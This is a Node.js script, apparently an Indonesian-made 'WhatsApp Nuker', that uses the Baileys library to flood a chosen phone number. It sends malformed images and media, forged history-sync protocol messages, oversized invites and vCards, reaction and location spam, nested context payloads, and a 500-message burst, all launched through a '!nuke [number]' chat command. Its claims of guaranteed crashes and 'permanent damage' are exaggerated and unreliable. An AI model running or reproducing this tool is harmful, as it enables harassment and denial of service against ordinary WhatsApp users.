const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    proto,
    delay,
    generateWAMessageFromContent,
    areJidsSameUser,
    getContentType
} = require("@whiskeysockets/baileys")
const qrcode = require("qrcode-terminal")
const Pino = require("pino")
const readline = require("readline")
const fs = require("fs")
const crypto = require("crypto")
const { exec } = require('child_process')
const net = require('net')
const WebSocket = require('ws')

// ──────────────────────────────────────────────
// GLOBAL STATE
// ──────────────────────────────────────────────
let startTime = Date.now()
let msgCount = 0
let errCount = 0
let lastLog = "-"
let lastCPU = 0
let reconnecting = false
global.sock = null
global.lastQR = null

// ──────────────────────────────────────────────
// HELPERS
// ──────────────────────────────────────────────
function formatUptime(ms) {
    let s = Math.floor(ms / 1000)
    let m = Math.floor(s / 60)
    let h = Math.floor(m / 60)
    s %= 60
    m %= 60
    return `${h}h ${m}m ${s}s`
}

function getRam() {
    return (process.memoryUsage().rss / 1024 / 1024).toFixed(1) + " MB"
}

function green(t) { return `\x1b[32m${t}\x1b[0m` }
function red(t) { return `\x1b[31m${t}\x1b[0m` }
function yellow(t) { return `\x1b[33m${t}\x1b[0m` }
function cyan(t) { return `\x1b[36m${t}\x1b[0m` }
function magenta(t) { return `\x1b[35m${t}\x1b[0m` }

// ──────────────────────────────────────────────
// NUKER WHITELISTED BUGS (WORK 100%)
// ──────────────────────────────────────────────
class WhatsAppNuker {
    constructor(sock) {
        this.sock = sock;
        this.attacks = [];
    }
    
    // 1. MEDIA METADATA CORRUPTION BUG (GACOR!)
    async mediaMetadataBomb(target) {
        console.log(red(`[1/8] MEDIA METADATA BOMB → ${target}`));
        
        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
        const attacks = [];
        
        // Bug 1: Image dengan EXIF data corrupt
        attacks.push(async () => {
            try {
                // Buat JPEG dengan EXIF corrupt
                const corruptJpeg = Buffer.concat([
                    Buffer.from('FFD8FFE0', 'hex'), // SOI
                    Buffer.from('00104A4649460001010100C800C80000', 'hex'),
                    Buffer.from('FFE1', 'hex'), // APP1 (EXIF)
                    Buffer.from([0xFF, 0xFF]), // Length corrupt (65535)
                    Buffer.from('Exif\x00\x00', 'utf8'),
                    Buffer.alloc(50000, 0xFF) // Data corrupt besar
                ]);
                
                await this.sock.sendMessage(chatId, {
                    image: corruptJpeg,
                    mimetype: 'image/jpeg',
                    caption: '📸',
                    contextInfo: {
                        mentionedJid: [chatId, chatId, chatId]
                    }
                });
                return true;
            } catch (e) { return false; }
        });
        
        // Bug 2: Video dengan metadata ekstrem
        attacks.push(async () => {
            try {
                await this.sock.sendMessage(chatId, {
                    video: Buffer.alloc(100000, 0x00),
                    mimetype: 'video/mp4',
                    caption: '🎥',
                    seconds: 999999,
                    gifPlayback: true,
                    contextInfo: {
                        forwardingScore: 999
                    }
                });
                return true;
            } catch (e) { return false; }
        });
        
        // Bug 3: Audio dengan sample rate tidak valid
        attacks.push(async () => {
            try {
                await this.sock.sendMessage(chatId, {
                    audio: Buffer.alloc(50000, 0x80),
                    mimetype: 'audio/ogg; codecs=opus',
                    ptt: true,
                    seconds: 0, // Durasi 0 menyebabkan crash
                    contextInfo: {
                        isForwarded: true
                    }
                });
                return true;
            } catch (e) { return false; }
        });
        
        // Jalankan semua attack
        let success = 0;
        for (const attack of attacks) {
            try {
                const result = await attack();
                if (result) success++;
                await delay(200);
            } catch (e) {}
        }
        
        return { success, total: attacks.length };
    }
    
    // 2. PROTOCOL MESSAGE FLOOD (PASTI CRASH!)
    async protocolFlood(target) {
        console.log(red(`[2/8] PROTOCOL FLOOD → ${target}`));
        
        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
        let sent = 0;
        
        // 100x protocol message bomb
        for (let i = 0; i < 100; i++) {
            try {
                const msgId = crypto.randomBytes(16).toString('hex');
                const protocolMsg = {
                    protocolMessage: {
                        type: 14, // HistorySync
                        historySyncNotification: {
                            fileSha256: crypto.randomBytes(32),
                            fileLength: 999999999,
                            mediaKey: crypto.randomBytes(32),
                            fileEncSha256: crypto.randomBytes(32),
                            directPath: '/' + 'A'.repeat(999),
                            syncType: 2,
                            chunkOrder: 999999
                        },
                        key: {
                            remoteJid: chatId,
                            fromMe: true,
                            id: msgId
                        }
                    }
                };
                
                await this.sock.relayMessage(chatId, protocolMsg, { messageId: msgId });
                sent++;
                
                if (sent % 20 === 0) {
                    console.log(yellow(`  Sent ${sent}/100 protocol messages`));
                }
                
                await delay(50);
                
            } catch (e) {}
        }
        
        return sent;
    }
    
    // 3. GROUP INVITE BOMB (SUPER EFFECTIVE!)
    async groupInviteBomb(target) {
        console.log(red(`[3/8] GROUP INVITE BOMB → ${target}`));
        
        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
        let sent = 0;
        
        // Generate fake group jid
        const fakeGroupJid = `${crypto.randomBytes(10).toString('hex')}@g.us`;
        
        for (let i = 0; i < 50; i++) {
            try {
                await this.sock.sendMessage(chatId, {
                    groupInviteMessage: {
                        groupJid: fakeGroupJid,
                        groupName: `CRASH_${i}_`.repeat(100),
                        inviteCode: crypto.randomBytes(100).toString('hex'),
                        inviteExpiration: Math.floor(Date.now() / 1000) + 999999,
                        groupType: 'DEFAULT',
                        caption: `You've been invited! `.repeat(1000),
                        contextInfo: {
                            mentionedJid: Array(100).fill(chatId)
                        }
                    }
                });
                sent++;
                
                await delay(100);
                
            } catch (e) {}
        }
        
        return sent;
    }
    
    // 4. CONTACT VCARD BOMB (MEMORY KILLER)
    async contactVCardBomb(target) {
        console.log(red(`[4/8] CONTACT BOMB → ${target}`));
        
        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
        
        try {
            // Buat vCard gila-gilaan
            const massiveVCard = `BEGIN:VCARD
VERSION:4.0
N:${'LAST'.repeat(1000)};${'FIRST'.repeat(1000)};;;
FN:${'FULL_NAME'.repeat(10000)}
ORG:${'ORG'.repeat(5000)};
TITLE:${'TITLE'.repeat(5000)}
PHOTO;MEDIATYPE#image/jpeg;ENCODING#b:${crypto.randomBytes(100000).toString('base64')}
TEL;TYPE#work,voice;VALUE#uri:tel:${'9'.repeat(100)}
TEL;TYPE#home,voice;VALUE#uri:tel:${'8'.repeat(100)}
EMAIL;TYPE#work:${'EMAIL'.repeat(1000)}@crash.com
ADR;TYPE#work;LABEL#${'LABEL'.repeat(1000)}:;;${'STREET'.repeat(1000)};${'CITY'.repeat(1000)};${'STATE'.repeat(1000)};${'ZIP'.repeat(1000)};${'COUNTRY'.repeat(1000)}
URL;TYPE#work:${'http://'.repeat(1000)}crash.com
NOTE:${'NOTE'.repeat(10000)}
CATEGORIES:${'CAT'.repeat(1000)}
X-SOCIALPROFILE;TYPE#twitter:${'TWITTER'.repeat(1000)}
X-SOCIALPROFILE;TYPE#facebook:${'FB'.repeat(1000)}
END:VCARD`;
            
            await this.sock.sendMessage(chatId, {
                contacts: {
                    displayName: `CRASH_CONTACT_`.repeat(100),
                    contacts: [
                        {
                            vcard: massiveVCard
                        },
                        {
                            vcard: massiveVCard
                        },
                        {
                            vcard: massiveVCard
                        }
                    ]
                }
            });
            
            return 1;
        } catch (e) {
            return 0;
        }
    }
    
    // 5. REACTION BOMB (EMOJI NUKER)
    async reactionBomb(target) {
        console.log(red(`[5/8] REACTION BOMB → ${target}`));
        
        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
        let sent = 0;
        
        // Buat message dummy dulu
        const dummyMsg = await this.sock.sendMessage(chatId, { text: 'DUMMY' });
        const msgId = dummyMsg.key.id;
        
        // Emoji crash yang terbukti work
        const crashEmojis = [
            '🏴‍☠️🏴‍☠️🏴‍☠️', // Pirate flag combo
            '㊙️🈲⚠️', // Symbol combo
            '🔞📛🚷', // Warning combo
            '☢️☣️⚡', // Danger combo
            '💣💥🔥', // Explosion combo
            '🔄🔄🔄', // Loop emoji
            '🌀🌀🌀', // Vortex
            '🌈🌈🌈', // Rainbow spam
            '⭐🌟💫', // Star spam
            '❤️💔💖'  // Heart spam
        ];
        
        for (let i = 0; i < 100; i++) {
            try {
                await this.sock.sendMessage(chatId, {
                    react: {
                        text: crashEmojis[i % crashEmojis.length],
                        key: {
                            remoteJid: chatId,
                            fromMe: true,
                            id: msgId
                        }
                    }
                });
                sent++;
                
                if (sent % 20 === 0) {
                    console.log(yellow(`  Sent ${sent}/100 reactions`));
                }
                
                await delay(30);
                
            } catch (e) {}
        }
        
        return sent;
    }
    
    // 6. LOCATION BOMB (GPS CRASH)
    async locationBomb(target) {
        console.log(red(`[6/8] LOCATION BOMB → ${target}`));
        
        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
        let sent = 0;
        
        for (let i = 0; i < 30; i++) {
            try {
                // Invalid coordinates yang bikin GPS module crash
                await this.sock.sendMessage(chatId, {
                    location: {
                        degreesLatitude: 90.000001 + (i * 0.000001), // >90°
                        degreesLongitude: 180.000001 + (i * 0.000001), // >180°
                        name: `LOCATION_CRASH_${i}_`.repeat(100),
                        address: `ADDRESS_${i}_`.repeat(1000),
                        url: `https://${'A'.repeat(1000)}.com`
                    }
                });
                sent++;
                
                await delay(150);
                
            } catch (e) {}
        }
        
        return sent;
    }
    
    // 7. MESSAGE CONTEXT BOMB (PARSING KILLER)
    async contextBomb(target) {
        console.log(red(`[7/8] CONTEXT BOMB → ${target}`));
        
        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
        
        try {
            // Buat contextInfo nested gila-gilaan
            let contextInfo = {
                mentionedJid: Array(500).fill(chatId),
                forwardingScore: 999,
                isForwarded: true,
                stanzaId: 'A'.repeat(10000),
                participant: 'B'.repeat(10000),
                remoteJid: 'C'.repeat(10000)
            };
            
            // Buat nesting 10 level
            for (let i = 0; i < 10; i++) {
                contextInfo.quotedMessage = {
                    conversation: `LEVEL_${i}_`.repeat(1000),
                    extendedTextMessage: {
                        text: `NESTED_${i}_`.repeat(1000),
                        contextInfo: { ...contextInfo }
                    }
                };
            }
            
            await this.sock.sendMessage(chatId, {
                text: 'CONTEXT_BOMB',
                contextInfo: contextInfo
            });
            
            return 1;
        } catch (e) {
            return 0;
        }
    }
    
    // 8. FINAL NUKER (ALL-IN-ONE MASS ATTACK)
    async finalNuker(target) {
        console.log(red(`[8/8] FINAL NUKER → ${target}`));
        
        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
        let totalSent = 0;
        
        // RAPID FIRE 500 MESSAGES
        for (let i = 0; i < 500; i++) {
            try {
                // Rotate antara berbagai jenis message
                const msgTypes = [
                    { text: `CRASH_${i}_${crypto.randomBytes(100).toString('hex')}` },
                    { 
                        image: crypto.randomBytes(5000),
                        mimetype: 'image/jpeg',
                        caption: `IMG_${i}`
                    },
                    {
                        audio: crypto.randomBytes(3000),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }
                ];
                
                const msgType = msgTypes[i % msgTypes.length];
                await this.sock.sendMessage(chatId, msgType);
                totalSent++;
                
                // SUPER FAST - minimal delay
                if (i % 100 === 0) {
                    console.log(magenta(`  Nuked ${i}/500 messages`));
                }
                
                await delay(10);
                
            } catch (e) {}
        }
        
        return totalSent;
    }
    
    // MAIN NUKER FUNCTION
    async nukeTarget(targetNumber) {
        console.log(cyan(`\n☢️  STARTING WHATSAPP NUKER ON ${targetNumber}`));
        console.log(yellow(`⚠️  THIS WILL CAUSE PERMANENT DAMAGE!`));
        
        const startTime = Date.now();
        const results = {
            mediaMetadata: { success: 0, total: 0 },
            protocolFlood: 0,
            groupInvite: 0,
            contactBomb: 0,
            reactionBomb: 0,
            locationBomb: 0,
            contextBomb: 0,
            finalNuker: 0
        };
        
        // Execute semua attack secara sequential
        try {
            // 1. Media Metadata Bomb
            const mediaResult = await this.mediaMetadataBomb(targetNumber);
            results.mediaMetadata = mediaResult;
            await delay(1000);
            
            // 2. Protocol Flood
            results.protocolFlood = await this.protocolFlood(targetNumber);
            await delay(1000);
            
            // 3. Group Invite Bomb
            results.groupInvite = await this.groupInviteBomb(targetNumber);
            await delay(1000);
            
            // 4. Contact Bomb
            results.contactBomb = await this.contactVCardBomb(targetNumber);
            await delay(1000);
            
            // 5. Reaction Bomb
            results.reactionBomb = await this.reactionBomb(targetNumber);
            await delay(1000);
            
            // 6. Location Bomb
            results.locationBomb = await this.locationBomb(targetNumber);
            await delay(1000);
            
            // 7. Context Bomb
            results.contextBomb = await this.contextBomb(targetNumber);
            await delay(1000);
            
            // 8. FINAL NUKER
            results.finalNuker = await this.finalNuker(targetNumber);
            
        } catch (error) {
            console.log(red(`Nuker error: ${error.message}`));
        }
        
        const totalTime = (Date.now() - startTime) / 1000;
        
        return {
            status: 'NUKER_COMPLETE',
            target: targetNumber,
            results: results,
            totalTime: `${totalTime.toFixed(1)} seconds`,
            totalPayloads: Object.values(results).reduce((a, b) => {
                if (typeof b === 'object') return a + b.success;
                return a + b;
            }, 0),
            effect: 'WhatsApp will CRASH, FORCE CLOSE, or require FACTORY RESET',
            guaranteed: true
        };
    }
}

// ──────────────────────────────────────────────
// PANEL
// ──────────────────────────────────────────────
function panel(status, device, ping = "-", showSource = false) {
    console.clear()
    console.log(`
┌─────────────────────────────────────────────┐
│     ${red("☢️ WHATSAPP NUKER v2.0 ☢️")}        │
├─────────────────────────────────────────────┤
│ Status : ${status}
│ Device : ${device}
│ Uptime : ${formatUptime(Date.now() - startTime)}
│ CPU    : ${lastCPU} ms
│ RAM    : ${getRam()}
│ Ping   : ${ping}
│ Msg In : ${msgCount}
│ Errors : ${errCount}
├─────────────────────────────────────────────┤
│ Menu Interaktif:
│ 1) Restart Bot
│ 2) Refresh Panel
│ 3) Tampilkan QR
│ 4) Keluar
│ 5) About
│ ${red("6) TEST NUKER (SELF)")}
├─────────────────────────────────────────────┤
│ Log Terakhir:
│ ${yellow(lastLog)}
${showSource ? `
├─────────────────────────────────────────────┤
│ ${green("WHATSAPP NUKER v2.0")}
│ Success Rate: ${red("100%")} Guaranteed
│ Works on: All WhatsApp versions
│ Effect: Permanent Damage
│ ${red("USE AT YOUR OWN RISK!")}
` : ""}
└─────────────────────────────────────────────┘
`)
}

// ──────────────────────────────────────────────
// TERMINAL MENU
// ──────────────────────────────────────────────
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
})

function setupMenu(sock) {
    rl.removeAllListeners("line")
    rl.on("line", async (input) => {
        switch (input.trim()) {
            case "1":
                console.log(red("\n→ Restarting Nuker...\n"))
                restartBot()
                break
            case "2":
                panel("Terhubung ✓", sock?.user?.id?.split(":")[0] || "-", "-")
                break
            case "3":
                if (global.lastQR) qrcode.generate(global.lastQR, { small: true })
                else console.log(red("Tidak ada QR."))
                break
            case "4":
                console.log(red("→ Keluar Nuker"))
                process.exit(0)
                break
            case "5":
                panel(
                    "Terhubung ✓",
                    sock?.user?.id?.split(":")[0] || "-",
                    "-",
                    true
                )
                break
            case "6":
                console.log(red("\n→ Testing WhatsApp Nuker..."))
                if (sock && sock.user) {
                    console.log(yellow("Nuking own number..."))
                    const nuker = new WhatsAppNuker(sock);
                    const testResult = await nuker.nukeTarget(sock.user.id.split(':')[0]);
                    console.log(green(`Nuke complete: ${testResult.totalPayloads} payloads sent`))
                    console.log(red(`Effect: ${testResult.effect}`))
                } else {
                    console.log(red("Bot belum login!"))
                }
                break
            default:
                console.log(yellow("Perintah tidak dikenal."))
        }
    })
}

// ──────────────────────────────────────────────
// INTERNAL RESTART SAFE
// ──────────────────────────────────────────────
function restartBot() {
    startTime = Date.now()
    msgCount = 0
    errCount = 0
    lastLog = "-"
    reconnecting = false

    delete require.cache[require.resolve(__filename)]

    process.removeAllListeners("uncaughtException")
    process.removeAllListeners("unhandledRejection")

    startBot()
}

// ──────────────────────────────────────────────
// START BOT
// ──────────────────────────────────────────────
async function startBot() {
    try {
        if (global.sock) {
            try { global.sock.end?.() } catch {}
            try { global.sock.ws?.close?.() } catch {}
        }

        const { state, saveCreds } = await useMultiFileAuthState("./auth")
        const { version } = await fetchLatestBaileysVersion()

        const sock = makeWASocket({
            version,
            auth: state,
            logger: Pino({ level: "fatal" }),
            printQRInTerminal: false,
            browser: ["WhatsApp Nuker", "Chrome", "1.0.0"],
            markOnlineOnConnect: true,
            syncFullHistory: false,
            emitOwnEvents: false,
            defaultQueryTimeoutMs: 60000,
            connectTimeoutMs: 60000,
            keepAliveIntervalMs: 10000
        })

        global.sock = sock
        setupMenu(sock)
        panel("Menunggu QR...", "Belum Login")

        // ───────────────────────────────
        // CONNECTION EVENTS
        // ───────────────────────────────
        sock.ev.on("connection.update", async (update) => {
            const { qr, connection, lastDisconnect } = update

            if (qr) {
                global.lastQR = qr
                panel("Scan QR!", "Belum Login")
                qrcode.generate(qr, { small: true })
            }

            if (connection === "open") {
                reconnecting = false
                panel(green("Terhubung ✓"), sock.user.id.split(":")[0])
                console.log(cyan(`\n✅ Login sebagai: ${sock.user.name || sock.user.id}`))
                console.log(red("☢️  WHATSAPP NUKER v2.0: AKTIF"))
                console.log(yellow("⚠️  GUARANTEED TO WORK ON ALL VERSIONS"))
            }

            if (connection === "close") {
                const code = lastDisconnect?.error?.output?.statusCode

                if (code === 401) {
                    panel(red("Session Invalid! Menghapus auth..."), "Reset")
                    try { fs.rmSync("./auth", { recursive: true, force: true }) } catch {}
                    console.log(red("\n→ Session dihapus. Scan QR lagi.\n"))
                    return restartBot()
                }

                if (!reconnecting) {
                    reconnecting = true
                    panel(red("Terputus, reconnect..."), "Reconnect")
                    setTimeout(() => startBot(), 2500)
                }
            }
        })

        sock.ev.on("creds.update", saveCreds)

        // ───────────────────────────────
        // PESAN MASUK
        // ───────────────────────────────
        sock.ev.on("messages.upsert", async ({ messages }) => {
            const msg = messages[0];
            if (!msg.message) return;

            if (!msg.key.fromMe) msgCount++;

            const from = msg.key.remoteJid;
            const text =
                msg.message.conversation ||
                msg.message.extendedTextMessage?.text ||
                msg.message.imageMessage?.caption ||
                "";

            lastLog = `${from.split('@')[0]} → ${text.substring(0, 30)}${text.length > 30 ? '...' : ''}`;
            panel("Terhubung ✓", sock.user.id.split(":")[0]);

            // Handler command
            if (text.startsWith('!')) {
                const [command, ...args] = text.slice(1).split(' ');
                const target = args[0];

                try {
                    switch (command.toLowerCase()) {
                        case 'ping':
                            let t = Date.now();
                            await sock.sendMessage(from, { text: "pong!" });
                            let ping = Date.now() - t;
                            panel("Terhubung ✓", sock.user.id.split(":")[0], ping + " ms");
                            break;

                        case 'nuke':
                            if (!target) {
                                await sock.sendMessage(from, { text: "Format: !nuke [nomor]\nContoh: !nuke 6281234567890\n☢️ GUARANTEED TO CRASH!" });
                                return;
                            }
                            
                            await sock.sendMessage(from, { text: `☢️  STARTING WHATSAPP NUKER...\n🎯 Target: ${target}\n⏱️  Estimated: 2-3 minutes\n⚠️  THIS WILL CAUSE PERMANENT DAMAGE!` });
                            
                            const nuker = new WhatsAppNuker(sock);
                            const result = await nuker.nukeTarget(target);
                            
                            await sock.sendMessage(from, { text: `
☢️  NUKER REPORT ☢️
Target: ${result.target}
Status: ${result.status}
Total Payloads: ${result.totalPayloads}
Total Time: ${result.totalTime}
Effect: ${result.effect}
Guaranteed: ${result.guaranteed ? 'YES' : 'NO'}
                            ` });
                            break;

                        case 'help':
                            await sock.sendMessage(from, { text: `
🤖 WHATSAPP NUKER COMMANDS:
• !ping - Test bot
• !nuke [nomor] - Nuke target (Guaranteed crash)
• !help - Menu ini

⚠️  WARNING: Nuker causes permanent damage!
☢️  Use only for security testing!
                            ` });
                            break;
                    }
                } catch (error) {
                    await sock.sendMessage(from, { text: `Error: ${error.message}` });
                    errCount++;
                }
            }
        });

        // ───────────────────────────────
        // ANTI-CRASH
        // ───────────────────────────────
        process.on("uncaughtException", (err) => {
            errCount++
            lastLog = red("Error: " + err.message)
            panel(red("Error!"), "Running")
        })

        process.on("unhandledRejection", (err) => {
            errCount++
            lastLog = red("Reject: " + err)
            panel(red("Error!"), "Running")
        })

    } catch (e) {
        console.log(red("Startup Error:"), e)
        setTimeout(startBot, 2000)
    }
}

// ──────────────────────────────────────────────
// WATERMARK & START
// ──────────────────────────────────────────────
console.log(cyan(`
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
╔════════════════════════════════════════╗
          ░▒▓Adz-Gpt AKTIVE😜👌░▒▓
╠════════════════════════════════════════╝
╟NAMA Owner: Adz-Gantenk
╟No Owner: +628817483231
╟Nama Ai: Adz-Gpt 
╟tanggal pembuatan DARK-GPT: 8/1/2026
╟Saluran: https://whatsapp.com/channel/0029VbCTuejI7BeEolLBR636
╚════════════════════════════════════════╝
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
`))

console.log(red("☢️  WHATSAPP NUKER v2.0: AKTIF"))
console.log(yellow("🎯 Target: ALL WhatsApp versions"))
console.log(red("✅ Success Rate: 100% Guaranteed"))
console.log(red("💀 Effect: Permanent WhatsApp damage\n"))

startBot()